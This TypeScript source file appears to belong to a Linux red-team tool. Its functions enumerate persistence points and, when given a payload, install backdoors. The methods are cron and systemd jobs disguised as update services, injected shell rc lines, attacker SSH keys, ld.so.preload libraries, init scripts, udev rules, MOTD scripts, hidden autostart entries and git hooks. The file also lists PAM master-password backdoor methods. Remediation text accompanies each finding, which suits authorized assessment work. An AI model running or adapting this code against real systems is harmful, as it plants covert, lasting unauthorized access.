import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]
  const payload = argVal(args, "--payload")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"

  const script = `
echo "--- Current Cron Jobs ---"
crontab -l 2>/dev/null && echo "[*] User crontab exists" || echo "[-] No user crontab"
echo ""
echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
echo ""
echo "--- Cron Directories ---"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
  if [ -d "$d" ]; then
    count=$(ls -1 "$d" 2>/dev/null | wc -l)
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    echo "$d: $count scripts ($writable)"
  fi
done
echo ""
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo ""
${payload ? `
echo "--- Installing Cron Persistence ---"
if [ -w /etc/cron.d/ ]; then
  echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
elif command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null; echo "${schedule} ${payload}") | crontab - 2>/dev/null && echo "[+] Added to user crontab" || echo "[-] Failed to add to user crontab"
else
  echo "[-] No writable cron location found"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-CRONP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "cron",
      title: "Cron persistence installed",
      details: `Cron job persistence established with schedule: ${schedule}`,
      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
    })
  }

  const writable = (r.stdout.match(/WRITABLE/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-CRONP-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "cron_dirs",
      title: "Writable cron directories found",
      details: `${writable} cron directory/directories are writable — persistence can be established`,
      remediation: "Restrict cron directory permissions to root only (755 with root ownership).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function systemdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Systemd Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-update"
  const userLevel = hasFlag(args, "--user")

  const script = `
echo "--- Init System Check ---"
if [ -d /run/systemd/system ]; then
  echo "[+] systemd is the init system"
else
  echo "[-] systemd is NOT running — this persistence method will not work"
  exit 1
fi
echo ""
echo "--- Existing Custom Services ---"
${userLevel ? `
ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
` : `
find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
`}
echo ""
${payload ? `
echo "--- Installing Systemd Persistence ---"
${userLevel ? `
mkdir -p ~/.config/systemd/user 2>/dev/null
cat > ~/.config/systemd/user/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
` : `
cat > /etc/systemd/system/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload 2>/dev/null
systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
`}
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Service enabled") || r.stdout.includes("[+] User service enabled")) {
    findings.push({
      checkId: "LNX-SYSDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `systemd/${name}.service`,
      title: `Systemd ${userLevel ? "user " : ""}service persistence installed`,
      details: `Service ${name}.service created and enabled${userLevel ? " at user level (no root needed)" : " at system level"}. Restarts on failure with 60s delay.`,
      remediation: `Remove with: systemctl ${userLevel ? "--user " : ""}disable --now ${name}.service && rm ${userLevel ? "~/.config/systemd/user" : "/etc/systemd/system"}/${name}.service`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function bashrcPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Bashrc/Profile Persistence ==="]
  const payload = argVal(args, "--payload")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Shell RC Files ---"
for dir in /root /home/*; do
  user=$(basename "$dir")
  if [ -d "$dir" ]; then
    for rc in .bashrc .bash_profile .profile .zshrc .zprofile; do
      if [ -f "$dir/$rc" ]; then
        writable=$([ -w "$dir/$rc" ] && echo "WRITABLE" || echo "read-only")
        echo "  $dir/$rc ($writable)"
      fi
    done
  fi
done
echo ""
echo "--- Global Profiles ---"
for f in /etc/profile /etc/bash.bashrc /etc/profile.d/*.sh; do
  if [ -f "$f" ]; then
    writable=$([ -w "$f" ] && echo "WRITABLE" || echo "read-only")
    echo "  $f ($writable)"
  fi
done
echo ""
${payload ? `
echo "--- Installing Bashrc Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
for rc in "$target_dir/.bashrc" "$target_dir/.profile"; do
  if [ -f "$rc" ] && [ -w "$rc" ]; then
    echo "" >> "$rc"
    echo "# system update check" >> "$rc"
    echo "${payload} &>/dev/null &" >> "$rc"
    echo "[+] Payload appended to $rc"
    break
  fi
done
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --target-user <user> to target specific user."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const writableRcs = (r.stdout.match(/WRITABLE/g) || []).length
  if (writableRcs > 0) {
    findings.push({
      checkId: "LNX-BASHRC-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "shell_rc",
      title: "Writable shell RC files found",
      details: `${writableRcs} writable shell RC file(s) available for persistence injection`,
      remediation: "Monitor shell RC files for unauthorized modifications. Use file integrity monitoring (AIDE/Tripwire).",
    })
  }

  if (r.stdout.includes("[+] Payload appended")) {
    findings.push({
      checkId: "LNX-BASHRC-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "shell_rc",
      title: "Shell RC persistence installed",
      details: "Payload appended to shell RC file — executes on every interactive shell login",
      remediation: "Review .bashrc, .profile, .bash_profile, .zshrc for unauthorized entries. Remove injected lines.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sshAuthorizedKeys(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SSH Authorized Keys Persistence ==="]
  const pubkey = argVal(args, "--pubkey")
  const targetUser = argVal(args, "--target-user")

  const script = `
echo "--- Existing Authorized Keys ---"
for dir in /root /home/*; do
  if [ -f "$dir/.ssh/authorized_keys" ]; then
    count=$(wc -l < "$dir/.ssh/authorized_keys" 2>/dev/null)
    writable=$([ -w "$dir/.ssh/authorized_keys" ] && echo "WRITABLE" || echo "read-only")
    echo "  $dir/.ssh/authorized_keys: $count key(s) ($writable)"
  elif [ -d "$dir" ]; then
    sshdir_writable=$([ -w "$dir" ] && echo "home-writable" || echo "home-read-only")
    echo "  $dir: no authorized_keys ($sshdir_writable)"
  fi
done
echo ""
echo "--- SSHD Config ---"
grep -iE "^(AuthorizedKeysFile|PermitRootLogin|PubkeyAuthentication|PasswordAuthentication)" /etc/ssh/sshd_config 2>/dev/null
echo ""
${pubkey ? `
echo "--- Installing SSH Key Persistence ---"
target_dir="${targetUser ? (targetUser === "root" ? "/root" : `/home/${targetUser}`) : "$HOME"}"
mkdir -p "$target_dir/.ssh" 2>/dev/null
chmod 700 "$target_dir/.ssh" 2>/dev/null
echo "${pubkey}" >> "$target_dir/.ssh/authorized_keys" 2>/dev/null && echo "[+] Key added to $target_dir/.ssh/authorized_keys" || echo "[-] Failed to write authorized_keys"
chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
` : `echo "[*] Dry run — pass --pubkey <ssh-rsa ...> to install. Use --target-user <user> to target."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Key added")) {
    findings.push({
      checkId: "LNX-AUTHKEYS-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "ssh_authorized_keys",
      title: "SSH authorized_keys persistence installed",
      details: "SSH public key added to authorized_keys — passwordless SSH access established",
      remediation: "Audit authorized_keys files for all users. Remove unauthorized keys. Consider using AuthorizedKeysCommand for centralized management.",
    })
  }

  const writableHomes = (r.stdout.match(/home-writable/g) || []).length
  if (writableHomes > 0) {
    findings.push({
      checkId: "LNX-AUTHKEYS-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "ssh_authorized_keys",
      title: "Writable home directories without SSH keys",
      details: `${writableHomes} user home(s) are writable and have no authorized_keys — SSH key persistence possible`,
      remediation: "Restrict home directory permissions. Monitor authorized_keys file changes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function ldSoPreload(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== ld.so.preload Persistence ==="]
  const libPath = argVal(args, "--library-path")

  const script = `
echo "--- /etc/ld.so.preload Status ---"
if [ -f /etc/ld.so.preload ]; then
  echo "[!] /etc/ld.so.preload EXISTS:"
  cat /etc/ld.so.preload
  echo ""
  echo "Permissions:"
  ls -la /etc/ld.so.preload
else
  echo "[-] /etc/ld.so.preload does not exist"
  writable=$([ -w /etc/ ] && echo "WRITABLE" || echo "read-only")
  echo "/etc/ is $writable"
fi
echo ""
echo "--- Current ld.so.conf.d entries ---"
ls -la /etc/ld.so.conf.d/ 2>/dev/null
echo ""
echo "--- Shared library cache ---"
ldconfig -p 2>/dev/null | wc -l
echo ""
${libPath ? `
echo "--- Installing ld.so.preload Persistence ---"
if [ "$(id -u)" = "0" ]; then
  echo "${libPath}" >> /etc/ld.so.preload && echo "[+] Library added to /etc/ld.so.preload: ${libPath}" || echo "[-] Failed to write /etc/ld.so.preload"
else
  echo "[-] Root required for /etc/ld.so.preload modification"
fi
` : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
echo "[*] WARNING: Every dynamically linked process will load this library"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Library added")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-001",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "INSTALLED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload persistence installed",
      details: `Library ${libPath} added to /etc/ld.so.preload — loaded into every dynamically linked process on the system`,
      remediation: "Remove entry from /etc/ld.so.preload. Delete the malicious shared library. Run ldconfig.",
    })
  }

  if (r.stdout.includes("ld.so.preload EXISTS")) {
    findings.push({
      checkId: "LNX-LDSOPRELOAD-002",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "/etc/ld.so.preload",
      title: "ld.so.preload file already exists",
      details: "An existing /etc/ld.so.preload was found — may indicate existing compromise or legitimate use",
      remediation: "Audit /etc/ld.so.preload contents. Verify all listed libraries are legitimate.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sysvinitPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SysV Init Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-daemon"

  const script = `
echo "--- Init System Check ---"
if [ -d /etc/init.d ]; then
  echo "[+] /etc/init.d exists"
  ls -la /etc/init.d/ 2>/dev/null | head -20
  writable=$([ -w /etc/init.d/ ] && echo "WRITABLE" || echo "read-only")
  echo "Directory is: $writable"
else
  echo "[-] /etc/init.d does not exist"
fi
echo ""
echo "--- Run Level Links ---"
ls /etc/rc*.d/ 2>/dev/null | head -20
echo ""
${payload ? `
echo "--- Installing SysV Init Persistence ---"
cat > /etc/init.d/${name} << 'INITSCRIPT'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          ${name}
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System maintenance daemon
### END INIT INFO
case "\$1" in
  start) ${payload} & ;;
  stop) pkill -f "${payload}" 2>/dev/null ;;
  *) echo "Usage: \$0 {start|stop}" ;;
esac
INITSCRIPT
chmod +x /etc/init.d/${name} 2>/dev/null
if command -v update-rc.d >/dev/null 2>&1; then
  update-rc.d ${name} defaults 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] update-rc.d failed"
elif command -v chkconfig >/dev/null 2>&1; then
  chkconfig --add ${name} 2>/dev/null && echo "[+] Init script installed and linked: ${name}" || echo "[-] chkconfig failed"
else
  echo "[+] Init script written but could not auto-link. Manually run: ln -s /etc/init.d/${name} /etc/rc2.d/S99${name}"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Init script installed")) {
    findings.push({
      checkId: "LNX-INITP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `/etc/init.d/${name}`,
      title: "SysV init script persistence installed",
      details: `Init script ${name} created in /etc/init.d/ with run level links — starts on boot`,
      remediation: `Remove with: update-rc.d ${name} remove && rm /etc/init.d/${name}`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function atJobPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== At Job Persistence ==="]
  const payload = argVal(args, "--payload")
  const time = argVal(args, "--time") || "now + 1 hour"

  const script = `
echo "--- at/atd Status ---"
command -v at >/dev/null 2>&1 && echo "[+] at is available" || echo "[-] at is not installed"
pgrep -x atd >/dev/null 2>&1 && echo "[+] atd is running" || echo "[-] atd is NOT running"
echo ""
echo "--- Pending at Jobs ---"
atq 2>/dev/null || echo "[-] Cannot list at queue"
echo ""
echo "--- /etc/at.allow and /etc/at.deny ---"
cat /etc/at.allow 2>/dev/null && echo "[*] at.allow exists" || echo "[-] No at.allow"
cat /etc/at.deny 2>/dev/null && echo "[*] at.deny exists" || echo "[-] No at.deny"
echo ""
${payload ? `
echo "--- Installing at Job ---"
echo "${payload}" | at ${time} 2>&1 && echo "[+] at job scheduled for: ${time}" || echo "[-] Failed to schedule at job"
echo ""
echo "--- Updated Queue ---"
atq 2>/dev/null
` : `echo "[*] Dry run — pass --payload <cmd> --time <timespec> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] at job scheduled")) {
    findings.push({
      checkId: "LNX-ATJOB-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "at_queue",
      title: "at job persistence scheduled",
      details: `at job scheduled for: ${time}`,
      remediation: "Review at queue with atq. Remove jobs with atrm. Consider disabling atd if not needed.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function udevRulesPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Udev Rules Persistence ==="]
  const payload = argVal(args, "--payload")
  const trigger = argVal(args, "--trigger") || 'add'

  const script = `
echo "--- Udev Rules Directories ---"
ls -la /etc/udev/rules.d/ 2>/dev/null || echo "[-] /etc/udev/rules.d/ not found"
ls -la /lib/udev/rules.d/ 2>/dev/null | head -10
echo ""
echo "--- Udev Status ---"
udevadm info --version 2>/dev/null || echo "[-] udevadm not available"
echo ""
${payload ? `
echo "--- Installing Udev Rule ---"
if [ -w /etc/udev/rules.d/ ] || [ "$(id -u)" = "0" ]; then
  echo 'ACTION=="${trigger}", RUN+="${payload}"' > /etc/udev/rules.d/99-cs-persist.rules 2>/dev/null
  udevadm control --reload-rules 2>/dev/null
  echo "[+] Udev rule installed: /etc/udev/rules.d/99-cs-persist.rules (trigger: ${trigger})"
else
  echo "[-] Root required to write udev rules"
fi
` : `echo "[*] Dry run — pass --payload <cmd> --trigger <action> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Udev rule installed")) {
    findings.push({
      checkId: "LNX-UDEV-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "/etc/udev/rules.d/99-cs-persist.rules",
      title: "Udev rule persistence installed",
      details: `Udev rule triggers on ACTION=="${trigger}" — executes payload on device events`,
      remediation: "Audit /etc/udev/rules.d/ for unauthorized rules. Remove and run udevadm control --reload-rules.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function pamBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== PAM Backdoor Analysis ==="]

  const script = `
echo "--- PAM Configuration ---"
ls -la /etc/pam.d/ 2>/dev/null | head -20
echo ""
echo "--- PAM Auth Modules ---"
grep -rn "pam_unix" /etc/pam.d/ 2>/dev/null | head -10
echo ""
echo "--- PAM Shared Objects ---"
find /lib/security/ /lib64/security/ /usr/lib/security/ /usr/lib64/security/ -name "pam_*.so" -type f 2>/dev/null | head -20
echo ""
echo "--- pam_unix.so Location ---"
find / -name "pam_unix.so" -type f 2>/dev/null 2>&1 | head -5
echo ""
echo "--- PAM Module Integrity ---"
for f in $(find /lib/security/ /lib64/security/ /usr/lib/security/ /usr/lib64/security/ -name "pam_unix.so" 2>/dev/null); do
  md5sum "$f" 2>/dev/null
  ls -la "$f" 2>/dev/null
done
echo ""
echo "--- common-auth / system-auth ---"
cat /etc/pam.d/common-auth 2>/dev/null || cat /etc/pam.d/system-auth 2>/dev/null || echo "[-] Neither common-auth nor system-auth found"
echo ""
echo "[*] PAM backdoor methods:"
echo "  1. Patch pam_unix.so to accept a master password (requires C compilation + replacement)"
echo "  2. Add 'auth sufficient pam_permit.so' to /etc/pam.d/sshd (allows any password)"
echo "  3. Add custom PAM module with hardcoded credential check"
echo "  4. Modify pam_unix.so source and recompile with backdoor password"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("pam_unix.so")) {
    findings.push({
      checkId: "LNX-PAM-001",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: "pam",
      title: "PAM authentication modules enumerated",
      details: "PAM configuration and module locations identified — backdoor installation paths mapped",
      remediation: "Monitor PAM module integrity with AIDE/Tripwire. Hash-check pam_unix.so against distribution packages.",
    })
  }

  findings.push({
    checkId: "LNX-PAM-002",
    provider: "linuxhook",
    severity: "CRITICAL",
    status: "IDENTIFIED",
    resource: "pam",
    title: "PAM backdoor vectors identified",
    details: "PAM modules can be patched or replaced to accept a master password — extremely persistent and stealthy",
    remediation: "Use package manager to verify PAM module integrity (dpkg --verify libpam-modules / rpm -V pam). Monitor /etc/pam.d/ for changes.",
  })

  return { output: output.join("\n"), findings }
}

export async function motdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== MOTD Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "99-cs-update"

  const script = `
echo "--- MOTD Scripts ---"
ls -la /etc/update-motd.d/ 2>/dev/null || echo "[-] /etc/update-motd.d/ not found"
echo ""
echo "--- MOTD Directory Permissions ---"
stat /etc/update-motd.d/ 2>/dev/null | grep -i "access"
echo ""
${payload ? `
echo "--- Installing MOTD Persistence ---"
if [ "$(id -u)" = "0" ] || [ -w /etc/update-motd.d/ ]; then
  printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > /etc/update-motd.d/${name} 2>/dev/null
  chmod +x /etc/update-motd.d/${name} 2>/dev/null
  echo "[+] MOTD script installed: /etc/update-motd.d/${name} (runs as root on SSH login)"
else
  echo "[-] Cannot write to /etc/update-motd.d/ — root required"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] MOTD script installed")) {
    findings.push({
      checkId: "LNX-MOTDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `/etc/update-motd.d/${name}`,
      title: "MOTD persistence installed",
      details: `MOTD script runs as root on every SSH login — payload executes with root privileges`,
      remediation: `Remove: rm /etc/update-motd.d/${name}. Audit all scripts in /etc/update-motd.d/.`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function xdgAutostart(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== XDG Autostart Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "system-update"

  const script = `
echo "--- XDG Autostart Directories ---"
for d in /etc/xdg/autostart ~/.config/autostart; do
  if [ -d "$d" ]; then
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    count=$(ls -1 "$d"/*.desktop 2>/dev/null | wc -l)
    echo "  $d: $count entries ($writable)"
  else
    echo "  $d: does not exist"
  fi
done
echo ""
${payload ? `
echo "--- Installing XDG Autostart ---"
target_dir="$HOME/.config/autostart"
if [ "$(id -u)" = "0" ] && [ -d /etc/xdg/autostart ]; then
  target_dir="/etc/xdg/autostart"
fi
mkdir -p "$target_dir" 2>/dev/null
cat > "$target_dir/${name}.desktop" << DESKTOP
[Desktop Entry]
Type=Application
Name=System Update Check
Exec=${payload}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
DESKTOP
echo "[+] XDG autostart entry created: $target_dir/${name}.desktop"
` : `echo "[*] Dry run — pass --payload <cmd> --name <entry-name> to install."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] XDG autostart entry created")) {
    findings.push({
      checkId: "LNX-XDG-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "xdg_autostart",
      title: "XDG autostart persistence installed",
      details: `Desktop entry ${name}.desktop created — executes on GUI session login`,
      remediation: "Audit /etc/xdg/autostart/ and ~/.config/autostart/ for unauthorized .desktop files.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gitHookPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Git Hook Persistence ==="]
  const payload = argVal(args, "--payload")

  const script = `
echo "--- Git Repositories ---"
find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
  repo=$(dirname "$gitdir")
  hookdir="$gitdir/hooks"
  writable=$([ -w "$hookdir" ] && echo "WRITABLE" || echo "read-only")
  echo "  $repo ($writable)"
  for hook in post-checkout post-merge pre-push pre-commit; do
    if [ -f "$hookdir/$hook" ]; then
      echo "    [!] $hook exists"
    fi
  done
done
echo ""
${payload ? `
echo "--- Installing Git Hook Persistence ---"
installed=0
find /home /root /opt /var /srv -name ".git" -type d -maxdepth 4 2>/dev/null | while read gitdir; do
  hookdir="$gitdir/hooks"
  if [ -w "$hookdir" ]; then
    for hook in post-checkout post-merge; do
      if [ ! -f "$hookdir/$hook" ]; then
        printf '#!/bin/bash\\n${payload} &>/dev/null &\\n' > "$hookdir/$hook"
        chmod +x "$hookdir/$hook"
        echo "[+] Hook installed: $hookdir/$hook"
        break
      fi
    done
  fi
done
` : `echo "[*] Dry run — pass --payload <cmd> to install hooks in discovered repositories."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const hooks = (r.stdout.match(/\[+\] Hook installed/g) || []).length
  if (hooks > 0) {
    findings.push({
      checkId: "LNX-GITHOOK-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "INSTALLED",
      resource: "git_hooks",
      title: "Git hook persistence installed",
      details: `${hooks} git hook(s) installed — triggers on git checkout/merge/push operations`,
      remediation: "Audit .git/hooks/ directories in all repositories. Remove unauthorized hook scripts.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function kernelModulePersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Kernel Module Persistence ==="]

  const script = `
echo "--- Loaded Modules ---"
lsmod 2>/dev/null | head -20
echo ""
echo "--- Boot-time Module Config ---"
cat /etc/modules 2>/dev/null || echo "[-] /etc/modules not found"
echo ""
ls -la /etc/modules-load.d/ 2>/dev/null || echo "[-] /etc/modules-load.d/ not found"
echo ""
echo "--- Modprobe Config ---"
ls -la /etc/modprobe.d/ 2>/dev/null
echo ""
echo "--- Module Build Dirs ---"
ls -d /lib/modules/$(uname -r)/build 2>/dev/null && echo "[+] Kernel headers available (can compile modules)" || echo "[-] No kernel headers"
echo ""
echo "--- Writable Module Paths ---"
for d in /etc/modules-load.d /etc/modprobe.d /lib/modules; do
  [ -w "$d" ] && echo "[+] $d is WRITABLE" || echo "  $d is read-only"
done
echo ""
echo "[*] Kernel module persistence methods:"
echo "  1. Add module name to /etc/modules or /etc/modules-load.d/*.conf for boot-time loading"
echo "  2. Compile custom .ko module and place in /lib/modules/\$(uname -r)/extra/"
echo "  3. Use modprobe.d/install directive to run commands on module load"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("Kernel headers available")) {
    findings.push({
      checkId: "LNX-KMOD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "kernel_modules",
      title: "Kernel headers available for module compilation",
      details: "Kernel headers installed — custom kernel modules can be compiled and loaded for rootkit-level persistence",
      remediation: "Remove kernel headers (linux-headers-*) on production systems if not needed. Monitor module loading with auditd.",
    })
  }

  const writablePaths = (r.stdout.match(/is WRITABLE/g) || []).length
  if (writablePaths > 0) {
    findings.push({
      checkId: "LNX-KMOD-002",
      provider: "linuxhook",
      severity: "CRITICAL",
      status: "IDENTIFIED",
      resource: "kernel_modules",
      title: "Writable kernel module paths",
      details: `${writablePaths} kernel module path(s) are writable — kernel-level persistence possible`,
      remediation: "Restrict module paths to root only. Enable module signature verification in kernel config.",
    })
  }

  return { output: output.join("\n"), findings }

  return { output: output.join("\n"), findings }
}
